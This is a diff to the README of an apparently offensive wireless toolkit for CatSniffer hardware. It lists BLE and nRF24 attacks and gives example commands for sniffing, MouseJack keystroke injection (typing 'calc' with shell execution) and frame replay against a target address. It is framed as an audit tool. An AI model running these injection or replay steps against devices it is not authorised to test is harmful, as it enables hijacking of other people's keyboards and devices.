@@ -57,6 +57,20 @@ Attack: airtag_spoofer
   [b] back
 ```
 
+## Attacks available
+
+```
+[BLE] airtag_scanner       Detecta AirTags / FindMy BLE en el entorno
+[BLE] airtag_spoofer       Emite anuncios BLE falsos de AirTag / FindMy
+[BLE] ble_sniffer          Sniffer BLE pasivo (Sniffle firmware)
+[BLE] justworks_scanner    Detecta dispositivos BLE JustWorks (sin PIN)
+
+[RF]  nrf24_sniffer        nRF24L01+ ESB sniffer (promiscuo, dirigido, scan)
+[RF]  nrf24_spoofer        nRF24L01+ ESB spoofer / MouseJack keystroke inject
+[RF]  nrf24_replayer       nRF24L01+ capture + replay interactivo
+[RF]  zigbee_sniffer       Zigbee / IEEE 802.15.4 sniffer
+```
+
 ## Architecture
 
 ```
@@ -71,13 +85,55 @@ CatSniffer_my_tool/
 │   ├── firmware.py       # Firmware flashing (catnip subprocess)
 │   └── ui.py             # Shared Rich helpers
 │
-└── attacks/
-    ├── base.py           # BaseAttack ABC  + AttackOption dataclass
-    ├── registry.py       # Global attack registry (decorator-based)
-    ├── ADDING_ATTACKS.md # Guide to add new attacks
-    └── ble/
-        └── airtag_spoofer.py
+├── attacks/
+│   ├── base.py           # BaseAttack ABC  + AttackOption dataclass
+│   ├── registry.py       # Global attack registry (decorator-based)
+│   ├── ADDING_ATTACKS.md # Guide to add new attacks
+│   ├── ble/
+│   │   ├── airtag_scanner.py
+│   │   ├── airtag_spoofer.py
+│   │   ├── ble_sniffer.py
+│   │   └── justworks_scanner.py
+│   └── rf/
+│       ├── zigbee_sniffer.py
+│       ├── nrf24_sniffer.py   # RX pasivo + PCAP export
+│       ├── nrf24_spoofer.py   # TX: MouseJack keystroke / string / raw
+│       └── nrf24_replayer.py  # Captura + REPLAY:RAW_HEX interactivo
+│
+└── firmware/
+    └── nrf24_sniffer_cc1352p7/
+        ├── README.md          # Instrucciones completas de build + uso
+        ├── nrf24_sniffer.c    # Firmware principal (RX + TX)
+        ├── nrf24_esb.h        # Parser + builder ESB portable
+        └── smartrf_settings.h # Config radio CC1352P7 (RX + TX)
 ```
+
+## nRF24L01+ / ESB attacks (nuevo)
+
+El firmware `nrf24-sniffer` añade soporte nRF24L01+ Enhanced ShockBurst
+sobre el CC1352P7 del CatSniffer — el **primer firmware nRF24/ESB para este
+hardware** (no existe en el ecosistema oficial de Electronic Cats).
+
+**Flujo típico de auditoría:**
+```bash
+# 1. Sniff promiscuo — descubrir dispositivos y addresses
+python main.py run nrf24_sniffer --set channel=scan --set mode=scan
+
+# 2. Sniff dirigido — capturar tráfico del target
+python main.py run nrf24_sniffer \
+  --set mode=directed --set addr=E7E7E7E7E7 --set channel=76 --set export_pcap=s
+
+# 3a. MouseJack — inyectar comando (dispositivo HID vulnerable)
+python main.py run nrf24_spoofer \
+  --set target_addr=E7E7E7E7E7 --set mode=string \
+  --set string=calc --set shell_exec=s
+
+# 3b. Replay — retransmitir un frame capturado
+python main.py run nrf24_replayer \
+  --set mode=directed --set addr=E7E7E7E7E7 --set channel=76
+```
+
+Ver [firmware/nrf24_sniffer_cc1352p7/README.md](firmware/nrf24_sniffer_cc1352p7/README.md) para instrucciones completas de compilación, protocolo UART y vectores de ataque.
 
 ## Adding a new attack
 
